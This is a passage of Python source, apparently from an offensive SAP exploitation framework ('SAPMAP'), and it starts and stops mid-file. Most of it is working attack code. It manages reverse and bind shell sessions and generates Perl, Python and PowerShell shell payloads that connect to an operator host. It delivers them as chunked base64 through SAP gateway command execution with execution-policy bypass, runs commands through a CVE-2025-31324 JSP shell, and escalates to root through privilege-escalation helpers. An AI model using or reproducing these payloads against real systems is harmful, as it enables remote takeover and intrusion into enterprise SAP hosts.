                  f"MSHOST={p.hostname or '?'}{inst_hint}, "
                  f"discovered_via_wd_sid={p.discovered_via_wd_sid})")
    return new_placeholders
# ===========================================================================

import socket as _socket_mod

_shell_session = None
_shell_lock = threading.Lock()


class ShellSession:
    """Manages a single reverse shell TCP connection."""

    def __init__(self, port: int, target_sid: str, mode: str = "reverse"):
        self.port = port
        self.target_sid = target_sid
        self.mode = mode           # "reverse" or "bind"
        self.status = "idle"       # idle/waiting/connected/disconnected/error
        self.error_msg = ""
        self.progress_msg = ""     # transient progress info for UI
        self.cancelled = False     # set True to abort _send thread
        self.server_sock = None
        self.client_sock = None
        self.client_addr = None
        self.target_host = ""      # for bind mode: target IP to connect to
        self.output_buffer = []
        self.output_lock = threading.Lock()

    def start_listener(self):
        """Bind TCP listener and wait for reverse shell connection."""
        try:
            self.server_sock = _socket_mod.socket(
                _socket_mod.AF_INET, _socket_mod.SOCK_STREAM)
            self.server_sock.setsockopt(
                _socket_mod.SOL_SOCKET, _socket_mod.SO_REUSEADDR, 1)
            self.server_sock.bind(("0.0.0.0", self.port))
            self.server_sock.listen(1)
            self.status = "waiting"
            threading.Thread(target=self._listener_loop, daemon=True).start()
        except OSError as e:
            self.status = "error"
            self.error_msg = f"Cannot bind port {self.port}: {e}"

    def _listener_loop(self):
        try:
            self.server_sock.settimeout(120)
            self.client_sock, self.client_addr = self.server_sock.accept()
            self.client_sock.settimeout(None)  # blocking for reader
            self.status = "connected"
            self.server_sock.close()
            self.server_sock = None
            threading.Thread(target=self._reader_loop, daemon=True).start()
        except _socket_mod.timeout:
            self.status = "error"
            self.error_msg = "Timeout — no reverse shell connection received"
            self._close_server()
        except Exception as e:
            self.status = "error"
            self.error_msg = str(e)
            self._close_server()

    def start_connector(self, target_host: str, saprouter: str = ""):
        """Connect TO a bind shell on the target (bind mode)."""
        self.target_host = target_host
        self.status = "waiting"
        threading.Thread(
            target=self._connector_loop,
            args=(target_host, saprouter),
            daemon=True).start()

    def _connector_loop(self, target_host, saprouter):
        """Try to connect to the bind shell with retries."""
        import time
        for attempt in range(30):  # retry for 30 seconds
            if self.status != "waiting":
                return
            try:
                if saprouter:
                    from sap_saprouter import (connect_through_saprouter,
                                               build_route_for_port)
                    route = build_route_for_port(
                        saprouter, target_host, self.port)
                    self.client_sock = connect_through_saprouter(
                        route, timeout=5, talk_mode=1)  # raw TCP for shell
                else:
                    self.client_sock = _socket_mod.socket(
                        _socket_mod.AF_INET, _socket_mod.SOCK_STREAM)
                    self.client_sock.settimeout(5)
                    self.client_sock.connect((target_host, self.port))
                self.client_sock.settimeout(None)  # blocking for reader
                self.client_addr = (target_host, self.port)
                self.status = "connected"
                print(f"[+] Bind shell connected to "
                      f"{target_host}:{self.port}")
                threading.Thread(
                    target=self._reader_loop, daemon=True).start()
                return
            except Exception as e:
                print(f"[*] Bind shell connect attempt {attempt+1}/30 "
                      f"to {target_host}:{self.port}: {e}")
                time.sleep(1)
        self.status = "error"
        self.error_msg = (f"Could not connect to bind shell at "
                          f"{target_host}:{self.port} after 30 attempts")

    def _reader_loop(self):
        try:
            while self.status == "connected":
                data = self.client_sock.recv(4096)
                if not data:
                    self.status = "disconnected"
                    break
                with self.output_lock:
                    self.output_buffer.append(
                        data.decode("utf-8", errors="replace"))
        except Exception:
            if self.status == "connected":
                self.status = "disconnected"

    def send_input(self, text: str):
        if self.status == "connected" and self.client_sock:
            try:
                self.client_sock.sendall((text + "\n").encode())
            except Exception:
                self.status = "disconnected"

    def get_output(self) -> str:
        with self.output_lock:
            out = "".join(self.output_buffer)
            self.output_buffer.clear()
            return out

    def stop(self):
        self.status = "disconnected"
        self.cancelled = True
        self._close_client()
        self._close_server()

    def _close_server(self):
        if self.server_sock:
            try:
                self.server_sock.close()
            except Exception:
                pass
            self.server_sock = None

    def _close_client(self):
        if self.client_sock:
            try:
                self.client_sock.close()
            except Exception:
                pass
            self.client_sock = None


def _detect_local_ip(target_host: str, saprouter: str = "") -> str:
    """Detect which local IP can reach the target (or SAProuter first hop)."""
    # For SAProuter, we need to reach the router, not the final target
    reach_host = target_host
    if saprouter:
        try:
            from sap_saprouter import parse_route_string
            hops = parse_route_string(saprouter + f"/H/{target_host}/S/3200")
            reach_host = hops[0]["host"]
        except Exception:
            pass
    try:
        s = _socket_mod.socket(_socket_mod.AF_INET, _socket_mod.SOCK_DGRAM)
        s.connect((reach_host, 1))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1"


_WIN_SCC_ROOT_TEMPLATES = (
    r"{drive}\SAP\scc20",
    r"{drive}\SAP\scc",
    r"{drive}\SAP\scc21",
    r"{drive}\SAP\scc22",
    r"{drive}\SAP\scc19",
    r"{drive}\sap\scc",
    # Linux-style "usr" install root that some Windows operators copy
    # over from their on-prem layout — observed live on a P:\ drive.
    r"{drive}\usr\scc20",
    r"{drive}\usr\scc",
    r"{drive}\usr\scc21",
    r"{drive}\usr\scc22",
    r"{drive}\usr\scc19",
    r"{drive}\Program Files\SAP\Cloud Connector",
    r"{drive}\Program Files\SAP\SAP Cloud Connector",
)


def _enumerate_windows_drives(gw_run) -> list:
    """Return the list of mounted-fixed Windows drive letters as
    ``["C:", "D:", "P:", ...]`` using a SAPXPG-friendly probe.

    ``gw_run`` is a callable (cmd, params) -> stdout that runs an OS
    command via the SAP gateway (typically the ``_gw`` helper defined
    locally inside an exploit handler).  We avoid ``wmic`` (deprecated /
    removed on newer Windows) and use ``fsutil fsinfo drives`` which is
    built-in on every supported release.

    Always returns at least ``["C:"]`` so callers don't get an empty
    list when fsutil fails (rights / SAPXPG quoting / etc.).
    """
    drives = []
    try:
        out = gw_run("cmd.exe", r'/c fsutil fsinfo drives')
        # Tolerate the (str, bool) return shape used by some _gw helpers.
        if isinstance(out, tuple):
            out = out[0]
        text = (out or "").upper()
        # Output looks like:  Drives: A:\ C:\ D:\ P:\
        for tok in text.replace("DRIVES:", " ").split():
            tok = tok.strip().rstrip("\\").rstrip("/")
            if len(tok) == 2 and tok[1] == ":" and tok[0].isalpha():
                drives.append(tok)
    except Exception:
        pass
    if "C:" not in drives:
        drives.insert(0, "C:")
    return drives


def _expand_scc_roots_across_drives(drives) -> list:
    """Cross-product the SCC root templates with every drive letter."""
    roots = []
    for d in drives:
        for tpl in _WIN_SCC_ROOT_TEMPLATES:
            roots.append(tpl.format(drive=d))
    return roots


def _win_multistep_payload(ps_script: str, display: str) -> dict:
    """Build a multi-step Windows payload: write PS script to temp file,
    then execute it.

    EXTPROG is only 128 bytes in the SAPXPG protocol. PowerShell
    EncodedCommand payloads are ~1100 chars, so they get truncated.
    Instead, write the Base64-encoded script to a temp file in chunks
    via multiple 'cmd.exe /C echo ... >> file' calls, then run
    PowerShell to decode and execute from that file.

    GW path — each step dict has three keys:
      "command"     → EXTPROG (≤128 bytes, the executable only: "cmd.exe")
      "params"      → PARAMS  (≤255 bytes, arguments: "/C echo ...")
      "long_params" → "" to prevent old-kernel PARAMS+LONG_PARAMS concatenation
                      (kernel 700/742 appends LONG_PARAMS to PARAMS if non-empty)

    Returns a dict with "steps" (list of command/params dicts) and
    a final "command"/"params"/"long_params" that is the execute step.
    """
    import base64
    # Use %TEMP% (cmd.exe env-var) / $env:TEMP (PowerShell) so the path
    # resolves correctly on every Windows SAP system.  SAP sets %TEMP% to the
    # instance work/tmp directory (e.g. P:\usr\sap\TWT\tmp on TWT), which the
    # SAP service user always owns — unlike C:\Windows\Temp, which may have
    # restricted ACLs or trigger AV on first access.
    #
    # Keep filename short ("s") — the SXPG -e base64 has a 255-byte PARAMS
    # limit and every extra char in the decode_script costs ~2 base64 chars.
    tmp_cmd = r"%TEMP%\s"       # expanded by cmd.exe at runtime
    # For PowerShell, use a double-quoted string so $env:TEMP expands:
    #   gc "$env:TEMP\s"
    # Note: \" inside the outer "-quoted -c argument is a literal double-quote
    # via CommandLineToArgvW parsing.
    tmp_ps  = r"$env:TEMP\s"   # expanded by PowerShell at runtime

    # GW path: UTF-16LE Base64 (for PowerShell Unicode.GetString decode)
    enc_u16 = base64.b64encode(
        ps_script.encode("utf-16-le")).decode("ascii")
    chunk_size = 80
    gw_chunks = [enc_u16[i:i+chunk_size]
                 for i in range(0, len(enc_u16), chunk_size)]
    # Split every step into EXTPROG ("command") + PARAMS ("params").
    # Previously the full "cmd.exe /C echo ..." was put in "command" (EXTPROG),
    # which caused SAPXPG to call CreateProcess with the whole string as the
    # executable path → ERROR_INVALID_HANDLE (6) / WaitForSingleObject failure.
    # long_params="" prevents old kernels from appending LONG_PARAMS to PARAMS.
    steps = [
        # Clean up old file first (suppress "not found" errors)
        {"command": "cmd.exe",
         "params": "/C del /q %TEMP%\\s 2>nul",
         "long_params": ""},
    ]
    for idx, chunk in enumerate(gw_chunks):
        redir = ">" if idx == 0 else ">>"
        steps.append({
            "command": "cmd.exe",
            "params": f"/C echo {chunk}{redir}{tmp_cmd}",
            "long_params": "",
        })
    run_cmd_prog   = "powershell"
    # Read temp file via $env:TEMP (expands at runtime in PowerShell).
    # -replace removes any residual whitespace (e.g. trailing \r on some
    # Windows versions) before base64 decoding.
    # Inner \" are literal double-quotes via CommandLineToArgvW parsing.
    run_cmd_params = ("-nop -c \"$b=((gc \\\"" + tmp_ps + "\\\")"
                      "-join'')-replace'\\s','';iex([Text.Encoding]::"
                      "Unicode.GetString([Convert]::FromBase64String($b)))\"")
    assert len(run_cmd_prog)   <= 128, f"Execute EXTPROG too long: {run_cmd_prog!r}"
    assert len(run_cmd_params) <= 255, f"Execute PARAMS too long: {len(run_cmd_params)}"

    # SXPG path: write ASCII Base64 chunks to %TEMP%\s, decode to %TEMP%\s.ps1
    # then launch via "cmd.exe /C start /B powershell.exe -nop -File %TEMP%\s.ps1".
    #
    # The critical difference from the GW path: SXPG_STEP_XPG_START is a
    # *synchronous* RFC call — it blocks until the child process exits.
    # A bind shell (or any long-lived reverse shell) would deadlock because:
    #   - SXPG blocks on powershell.exe (waiting for AcceptTcpClient/session end)
    #   - start_connector is only called AFTER execute_local_command returns
    # Solution: launch PowerShell detached via "cmd.exe /C start /B ...".
    # cmd.exe exits immediately after spawning powershell, SXPG returns,
    # start_connector runs and connects to the waiting bind shell.
    sxpg_tmp_cmd = r"%TEMP%\s"       # cmd.exe path — expanded by cmd.exe
    sxpg_tmp_ps  = r"$env:TEMP\s"    # PowerShell path — expanded by PS
    sxpg_ps1_ps  = r"$env:TEMP\s.ps1"  # decoded script file (PS path)
    enc_ascii = base64.b64encode(
        ps_script.encode("ascii")).decode("ascii")
    sxpg_chunks = [enc_ascii[i:i+chunk_size]
                   for i in range(0, len(enc_ascii), chunk_size)]
    # Decode step: decode base64 from %TEMP%\s → write PS script to %TEMP%\s.ps1
    # Paths use double-quoted PS strings so $env:TEMP expands at runtime.
    # Inner \" are literal double-quotes via CommandLineToArgvW.
    sxpg_decode_params = ("-nop -c \"[IO.File]::WriteAllText("
                          "\\\"" + sxpg_ps1_ps + "\\\","
                          "[Text.Encoding]::ASCII.GetString("
                          "[Convert]::FromBase64String("
                          "-join(gc \\\"" + sxpg_tmp_ps + "\\\"))))\"")
    # Final execute step: launch .ps1 detached so cmd.exe (and SXPG) return
    # immediately without waiting for the shell session to end.
    # -ep bypass overrides the execution policy (Restricted by default on
    # Windows Server 2008 R2) which would otherwise block loading .ps1 files.
    # Inline -c commands are never blocked, only -File; so only this step needs it.
    sxpg_final_params = "/C start /B powershell.exe -nop -ep bypass -File %TEMP%\\s.ps1"
    assert len(sxpg_decode_params) <= 255, (
        f"SXPG decode params too long: {len(sxpg_decode_params)}")
    assert len(sxpg_final_params)  <= 255, (
        f"SXPG final params too long: {len(sxpg_final_params)}")

    sxpg_steps = [
        # Clean up old intermediate and script files
        {"command": "cmd.exe",
         "params": "/C del /q %TEMP%\\s %TEMP%\\s.ps1 2>nul"},
    ]
    for idx, chunk in enumerate(sxpg_chunks):
        redir = ">" if idx == 0 else ">>"
        sxpg_steps.append({
            "command": "cmd.exe",
            "params": f"/C echo {chunk}{redir}{sxpg_tmp_cmd}",
        })
    # Decode the base64 file into a .ps1 script file
    sxpg_steps.append({"command": "powershell.exe",
                        "params": sxpg_decode_params})
    return {
        "steps": steps,
        "command": run_cmd_prog,
        "params": run_cmd_params,
        "long_params": "",          # prevent PARAMS+LONG_PARAMS concat on old kernels
        "sxpg_steps": sxpg_steps,
        "sxpg_command": "cmd.exe",          # detached launch via start /B
        "sxpg_params": sxpg_final_params,
        # Raw PowerShell source — for backends (CVE-2025-31324 via JSP shell)
        # that don't have the 128/255-byte EXTPROG/PARAMS limits and can run
        # the script directly in one shot, skipping the chunked base64 write.
        "raw_ps_script": ps_script,
        "display": display,
    }


def _detect_is_windows(node, method: str = "sxpg",
                       soap_route: dict = None) -> bool:
    """Probe the target to determine whether it is Windows when os_type is unknown.

    Runs ``cmd.exe /C echo __SAPMAP_WIN__`` via SXPG, GW, or SOAP-RFC.
    If cmd.exe succeeds and echoes the token back, the target is
    Windows.  Result is cached on ``node.os_type`` so subsequent calls
    skip the probe.

    When ``soap_route`` is supplied AND the gateway port is unreachable,
    routes through SOAP-RFC SXPG instead of pyrfc — required for
    HTTP-only Type-G/H targets where the dispatcher/gateway are
    firewalled.

    Returns True if Windows, False otherwise.
    """
    cached = (node.os_type or "").lower()
    if cached:
        return any(w in cached for w in ("windows", "nt", "win"))

    probe_token = "__SAPMAP_WIN__"
    try:
        if method == "gateway" and node.gw_vulnerable:
            r = sapmap_exploit.execute_os_command(
                node, "cmd.exe", f"/C echo {probe_token}",
                soap_route=soap_route)
        elif method == "cve_31324" and node.cve_2025_31324_vulnerable:
            # Route through the dropped JSP if available (output capture),
            # otherwise fire the blind Runtime.exec gadget — in the latter
            # case we can't read the echo back, so assume Windows (SAP Java
            # deployments on Linux are rare and the caller can correct the
            # OS type via "Set OS Type").
            r = sapmap_exploit.execute_cve_2025_31324_via_shell(
                node, f"cmd.exe /C echo {probe_token}")
            if not (node.cve_2025_31324_shells):
                # Blind exec — no output to match; assume Windows.
                node.os_type = "Windows"
                return True
        elif soap_route:
            # SOAP-RFC route trumps pyrfc — every other probe path
            # would hang for 60s on the unreachable gateway port.
            r = sapmap_exploit.execute_os_command(
                node, "cmd.exe", f"/C echo {probe_token}",
                soap_route=soap_route, prefer="soap_rfc")
        else:
            creds = node.best_credentials()
            if not creds:
                return False
            r = sapmap_rfc.execute_local_command(
                node, "cmd.exe", f"/C echo {probe_token}", creds)
        if r.get("success") and any(
                probe_token in line for line in r.get("output", [])):
            node.os_type = "Windows"   # cache so we don't probe again
            return True
    except Exception:
        pass
    return False


def _detect_python_cmd(node, soap_route: dict = None) -> str:
    """Detect whether the target has python3 or python (2.x).
    Caches result on node._python_cmd.

    When ``soap_route`` is supplied AND the gateway is unreachable, the
    probe runs over SOAP-RFC SXPG — required for HTTP-only Type-G/H
    targets where pyrfc would hang for 60s per attempted command.
    """
    cached = getattr(node, "_python_cmd", None)
    if cached:
        return cached
    # Try python3 first via a quick GW, SXPG, or SOAP-RFC probe
    for cmd in ("python3", "python"):
        try:
            if node.gw_vulnerable:
                result = sapmap_exploit.execute_os_command(
                    node, cmd, "--version", soap_route=soap_route)
            elif soap_route:
                # No gw / pyrfc creds usable — SOAP is the only way.
                result = sapmap_exploit.execute_os_command(
                    node, cmd, "--version",
                    soap_route=soap_route, prefer="soap_rfc")
            else:
                creds = node.best_credentials()
                if creds:
                    result = sapmap_rfc.execute_local_command(
                        node, cmd, "--version", creds)
                else:
                    continue
            if result.get("success"):
                # Check output for errors — SAPXPG returns success
                # even when the program doesn't exist
                out = " ".join(result.get("output", [])).lower()
                if ("no such file" in out or "not found" in out
                        or "not recognized" in out
                        or "exit code 1" in out):
                    continue
                node._python_cmd = cmd
                print(f"[*] {node.sid}: Detected {cmd}")
                return cmd
        except Exception:
            pass
    # Default to python3
    node._python_cmd = "python3"
    return "python3"


def _perl_reverse_shell(ip: str, port: int, with_fork: bool = True) -> str:
    """Perl reverse shell — fallback when no Python on target.

    Uses Socket.pm which is part of Perl core on every *nix.
    fork()+exit(0) detaches the child so the SSH exec returns cleanly
    while the reverse shell keeps running.
    """
    f = 'if(fork()){exit(0);}' if with_fork else ''
    return (
        f'use Socket;{f}'
        f'$i="{ip}";$p={port};'
        f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
        f'if(connect(S,sockaddr_in($p,inet_aton($i))))'
        f'{{open(STDIN,">&S");open(STDOUT,">&S");'
        f'open(STDERR,">&S");exec("/bin/bash -i");}}'
    )


def _perl_bind_shell(port: int, with_fork: bool = True) -> str:
    """Perl bind shell — fallback when no Python on target."""
    f = 'if(fork()){exit(0);}close(STDOUT);close(STDERR);' if with_fork else ''
    return (
        f'use Socket;{f}'
        f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
        f'setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);'
        f'bind(S,sockaddr_in({port},INADDR_ANY));'
        f'listen(S,1);accept(C,S);'
        f'open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");'
        f'exec("/bin/bash -i");'
    )


def _generate_payload(os_type: str, ip: str, port: int,
                      python_cmd: str = "python3") -> dict:
    """Generate reverse shell payload based on OS type."""
    is_win = any(w in (os_type or "").lower() for w in ("windows", "nt", "win"))
    if is_win:
        ps = (f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
              f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
              f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
              f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
              f"$r=(iex $d 2>&1|Out-String);"
              f"$p=$r+'PS '+$(pwd).Path+'> ';"
              f"$t=([text.encoding]::ASCII).GetBytes($p);"
              f"$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close()")
        return _win_multistep_payload(ps, f"PowerShell reverse shell → {ip}:{port}")
    else:
        # SAPXPG splits PARAMS at spaces (execvp argv splitting).
        # With EXTPROG=python3 and PARAMS="-c <code>", SAPXPG produces
        # ["python3", "-c", "<code>"] which is correct — python3 gets
        # -c as flag and the code as a single argument.
        #
        # The code MUST have ZERO spaces. Use __import__() instead of
        # bare "import" statements, and semicolons for multi-statements.
        py_code = (
            f"s=__import__('socket').socket(2,1);"
            f"s.connect(('{ip}',{port}));"
            f"__import__('os').dup2(s.fileno(),0);"
            f"__import__('os').dup2(s.fileno(),1);"
            f"__import__('os').dup2(s.fileno(),2);"
            f"__import__('subprocess').call(['/bin/bash','-i'])"
        )
        assert " " not in py_code, f"Space in payload: {py_code}"
        return {
            "command": python_cmd,
            "params": f"-c {py_code}",
            "display": f"{python_cmd} reverse shell → {ip}:{port}",
        }


def _generate_bind_payload(os_type: str, port: int,
                           python_cmd: str = "python3") -> dict:
    """Generate bind shell payload — opens a listening port on the target."""
    is_win = any(w in (os_type or "").lower() for w in ("windows", "nt", "win"))
    if is_win:
        ps = (f"$l=New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any,{port});"
              f"$l.Start();"
              f"$c=$l.AcceptTcpClient();"
              f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
              f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
              f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
              f"$r=(iex $d 2>&1|Out-String);"
              f"$p=$r+'PS '+$(pwd).Path+'> ';"
              f"$t=([text.encoding]::ASCII).GetBytes($p);"
              f"$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close();$l.Stop()")
        return _win_multistep_payload(ps, f"PowerShell bind shell on port {port}")
    else:
        # Bind shell: listen on target, SAPMAP connects to it.
        # Zero spaces, under 255 chars (SXPG PARAMS limit).
        # Use short aliases: o=os, d=dup2, f=fileno
        py_code = (
            f"import(socket,os,subprocess);"  # dummy — replaced below
        )
        # Build compact code under 250 chars.
        # CRITICAL: must fork() so the bind shell survives after
        # SAPXPG/GW connection closes (P4 timeout kills the process).
        # Close fd 1+2 after fork so SXPG's stdout pipe gets EOF
        # and the RFC call returns (otherwise SXPG blocks forever).
        py_code = (
            f"o=__import__('os');"
            f"o.fork()and(o._exit(0));"
            f"o.close(1);o.close(2);"
            f"s=__import__('socket').socket(2,1);"
            f"s.setsockopt(1,2,1);"
            f"s.bind(('',{port}));"
            f"s.listen(1);"
            f"c,a=s.accept();"
            f"[o.dup2(c.fileno(),i)for(i)in(0,1,2)];"
            f"o.execv('/bin/bash',['/bin/bash','-i'])"
        )
        assert " " not in py_code, f"Space in bind payload: {py_code}"
        assert len(py_code) < 252, f"Bind payload too long: {len(py_code)} chars"
        return {
            "command": python_cmd,
            "params": f"-c {py_code}",
            "display": f"{python_cmd} bind shell on target port {port}",
        }


def _build_linuxlpe_shell_dispatch(prog: str, params_str: str) -> str:
    """Build the operator command that gets passed to run_linux_lpe
    for reverse/bind shell deployment under root context.

    Two transformations on top of the raw ``prog`` + ``params_str``
    that _generate_payload / _generate_bind_payload produce:

    1. **Shell-quote the python -c argument.**  The python socket-
       trick code (``__import__('socket')`` etc.) contains lots of
       single quotes and ``(...)`` groups that are FINE for argv-
       style execution via SAPXPG (which splits at spaces; we
       forbid spaces in the code) but get misinterpreted by
       ``/bin/sh`` when copyfail / dirtyfrag pipe the command
       through their wrapper script (sh sees ``__import__(...)``
       as a subshell metacharacter group, breaking the python -c
       argument apart).  ``shlex.quote`` wraps the code as a single
       sh-safe argument.

    2. **Base64-encode and dispatch via** ``echo <b64> | base64 -d
       | sh``.  The resulting full command going to copyfail /
       dirtyfrag contains ONLY base64 alphabet chars + pipe
       metacharacters — no single quotes, no parens.  copyfail's
       Python template substitution (now using ``repr()``) and
       dirtyfrag's wrapper-script writeback both handle this
       trivially.

    Wrapped in a ``nohup ... &`` subshell so the python process is
    detached BEFORE the wrapper script returns + the trailing &
    doesn't combine with the wrapper's own redirect.

    Returns the full command suitable for
    ``sapmap_lpe_auto.run_linux_lpe(node, full_cmd, fire_and_forget=True)``.
    """
    import shlex as _shlex
    import base64 as _b64s

    if params_str.startswith("-c "):
        py_code = params_str[3:]
        inner_payload = (
            f"nohup {prog} -c {_shlex.quote(py_code)} "
            f"</dev/null >/dev/null 2>&1 &"
        )
    else:
        # Generic shape — best-effort.  Today's _generate_payload /
        # _generate_bind_payload always produce `-c <py_code>` for
        # Linux, but this fallback keeps a future variant alive.
        inner_payload = (
            f"nohup {prog} {params_str} "
            f"</dev/null >/dev/null 2>&1 &"
        )

    # Wrap in a sub-shell so the trailing & doesn't try to combine
    # with the outer wrapper script's redirect (which would parse
    # as `&> file` = redirect both stdout+stderr instead of
    # background+redirect).
    inner_payload = f"({inner_payload})"

    inner_b64 = _b64s.b64encode(inner_payload.encode()).decode()
    return f"echo {inner_b64} | base64 -d | sh"


# ===========================================================================
# SAPMAPApi — Backend controller
# ===========================================================================

class SAPMAPApi:
    """Backend controller for SAPMAP operations."""

    def __init__(self):
        self.state = SAPMAPState()
        # Mirror CRITICAL / HIGH bus findings onto the matching SAPNode so
        # the "View Findings" panel + the engagement report carry them.
        try:
            sapmap_findings.attach_state(self.state)
        except Exception:
            pass
        self.scan_thread = None
        self.scan_running = False
        self.scan_cancelled = False
        self.cancel_event = threading.Event()
        self.scan_state = "idle"  # idle, running, complete, cancelled, error
        self.scan_error = ""
        self.operation_lock = threading.Lock()
        # BTP token store — process-memory only, NEVER serialised to
        # disk via SAPMAPState.  Map: region -> token string.  An
        # operator pasting a new token for the same region replaces
        # the previous one.  A blank token clears the slot.
        self.btp_tokens: dict = {}
        # BTP connectivity-proxy override.  Set by the operator via
        # Settings → BTP Connectivity Proxy Override (or per-call body
        # param).  Used by the PP-impersonation live probe — empty =
        # use the default internal hostname (only reachable from
        # inside BTP CF runtime); non-empty = a host:port the
        # operator has tunnelled to via ``cf ssh``.
        self.btp_proxy_override: str = ""
        # Connectivity-service token for the Proxy-Authorization
        # header on the live PP probe.  Obtained via the connectivity
        # service binding's ``client_credentials`` grant — see
        # tools/btp_ssh_bridge/README.md.  Process-memory only.
        self.btp_proxy_auth_token: str = ""

    def start_scan(self, config):
        if self.scan_running:
            return {"error": "Scan already running"}

        self.scan_running = True
        self.scan_cancelled = False
        self.cancel_event.clear()
        # Clear the global stop flag too so a previous STOP doesn't
        # immediately cancel the new scan.
        import sapmap_stop
        sapmap_stop.reset_stop()
        self.scan_state = "running"
        self.scan_error = ""

        # Clear findings buffer (banner + drawer reset for the new scan).
        # Keep the console buffer intact across scans — the operator wants
        # to see prior scan output too.  Append a visible divider so the
        # boundary between scans stays obvious.
        sapmap_findings.clear()

        targets_str = config.get("targets", "").strip()
        scan_label = f"Scan on target {targets_str}" if targets_str else "Network Scan"

        ts = datetime.now().strftime("%H:%M:%S")
        _add_console_line(
            ts,
            f"────────  New scan: {targets_str or '(no targets)'}  ────────",
            css_class="cl-info",
        )

        def _scan_fn():
            _task_start("_scan", scan_label)
            try:
                self._run_scan(config)
            finally:
                _task_end("_scan")
        self.scan_thread = threading.Thread(target=_scan_fn, daemon=True)
        self.scan_thread.start()
        return {"status": "started"}

    def _run_scan(self, config):
        try:
            targets_str = config.get("targets", "")
            inst_from = config.get("inst_from", 0)
            inst_to = config.get("inst_to", 99)
            threads = config.get("threads", 30)
            timeout = config.get("timeout", 3)
            fast_mode = config.get("fast_mode", True)

            # Advanced scan parameters
            concurrent_hosts = config.get("concurrent_hosts", 5)
            port_timeout = config.get("port_timeout", 3.0)
            alive_timeout = config.get("alive_timeout", 0.5)
            skip_alive = config.get("skip_alive", False)
            scc_probe_default_creds = bool(config.get("scc_probe_default_creds", False))

            # Pass advanced params via module-level config
            sapmap_scanner.ALIVE_TIMEOUT = alive_timeout

            targets = sapmap_scanner.parse_targets(targets_str)
            if not targets:
                print("[-] No valid targets found")
                self.scan_state = "error"
                self.scan_error = "No valid targets"
                self.scan_running = False
                return

            self.state.scan_config = config

            nodes = sapmap_scanner.discover_systems(
                targets,
                instance_range=(inst_from, inst_to),
                timeout=timeout,
                threads=threads,
                fast_mode=fast_mode,
                cancel_event=self.cancel_event,
                verbose=True,
                skip_alive=skip_alive,
                concurrent_hosts=concurrent_hosts,
                port_timeout=port_timeout,
                node_callback=lambda node: self.state.add_node(node),
                scc_callback=lambda scc: self.state.scc_nodes.update({scc.host: scc}),
                scc_probe_default_creds=scc_probe_default_creds,
            )

            # Add any nodes that weren't already added via callback (e.g. deep mode)
            for node in nodes:
                if node.sid not in self.state.nodes:
                    self.state.add_node(node)

            if self.cancel_event.is_set():
                self.scan_state = "cancelled"
            else:
                self.scan_state = "complete"

        except Exception as e:
            self.scan_state = "error"
            self.scan_error = str(e)
            print(f"[-] Scan error: {e}")
        finally:
            self.scan_running = False

    def stop_scan(self):
        # Three layers — older callers + new global poll:
        #  1. scanner.cancel_event (existing) — affects the scan loop
        #  2. registered betrusted stop_events (existing) — 10KBlaze
        #  3. process-wide sapmap_stop.request_stop() (new) — every
        #     long-running background op (RFC bulk tests, secstore
        #     extract, JSP deploy chunked upload, propagation chains)
        #     can poll is_stop_requested() and bail at a safe point
        self.cancel_event.set()
        self.scan_cancelled = True
        import sapmap_stop
        sapmap_stop.request_stop()
        n_bet = _signal_all_betrusted_stops()
        n_active = len(_get_active_tasks())
        msg_parts = ["[!] STOP requested"]
        msg_parts.append(f"scan cancel-event set")
        if n_bet:
            msg_parts.append(f"{n_bet} 10KBlaze betrusted run(s) signalled")
        if n_active:
            msg_parts.append(f"{n_active} active background task(s) "
                              f"flagged via sapmap_stop")
        print(" — ".join(msg_parts))
        return {"status": "stopping",
                "betrusted_cancelled": n_bet,
                "active_tasks_flagged": n_active}

    def get_state_dict(self):
        """Get current state as a dict for the frontend."""
        d = self.state.to_dict()
        d["scan_state"] = self.scan_state
        d["scan_error"] = self.scan_error
        d["stats"] = self.state.stats()
        d["active_tasks"] = _get_active_tasks()
        # Tokens themselves NEVER cross to the frontend, only the
        # list of regions for which a token is in memory — used to
        # gate the PP-impersonation-verify menu item.
        d["btp_token_regions"] = list((self.btp_tokens or {}).keys())
        d["btp_proxy_override"] = self.btp_proxy_override or ""
        d["btp_proxy_auth_token_present"] = bool(self.btp_proxy_auth_token)
        return d


# ===========================================================================
# Bottle app with routes
# ===========================================================================

def create_app(api: SAPMAPApi) -> Bottle:
    app = Bottle()

    # -- Serve the SPA --
    @app.route("/")
    def index():
        response.content_type = "text/html; charset=utf-8"
        response.set_header("Cache-Control", "no-cache, no-store, must-revalidate")
        return get_html()

    # -- Favicon --
    @app.route("/favicon.ico")
    def favicon():
        # File now lives in modules/core/; icons/ stays at project root.
        icons_dir = os.path.join(os.path.dirname(__file__),
                                 "..", "..", "icons")
        return static_file("sapmap.ico", root=icons_dir)

    # -- LPE blob serve --
    # In-memory staging for binary blobs that the LPE techniques need
    # to land on a Windows target.  When the SXPG primitive can't
    # carry the binary through LONG_PARAMS (kernel filtering), it
    # stages the blob here and runs Invoke-WebRequest on the target
    # to pull it down via this route.
    @app.route("/api/_lpe_blob/<token>")
    def serve_lpe_blob(token):
        from sap_lpe_blob_stage import get_blob
        blob = get_blob(token)
        if blob is None:
            response.status = 404
            return ""
        response.content_type = "application/octet-stream"
        response.set_header("Content-Length", str(len(blob)))
        return blob

    # -- Console polling --
    @app.route("/api/console")
    def get_console():
        response.content_type = "application/json"
        cursor = int(request.params.get("cursor", 0))
        with _console_lock:
            # Reset cursor if buffer was cleared (new scan started)
            if cursor > len(_console_lines):
                cursor = 0
            lines = _console_lines[cursor:]
            new_cursor = len(_console_lines)
        return json.dumps({"lines": lines, "cursor": new_cursor})

    # -- Findings polling (critical-finding banner + drawer) --
    @app.route("/api/findings")
    def get_findings():
        response.content_type = "application/json"
        try:
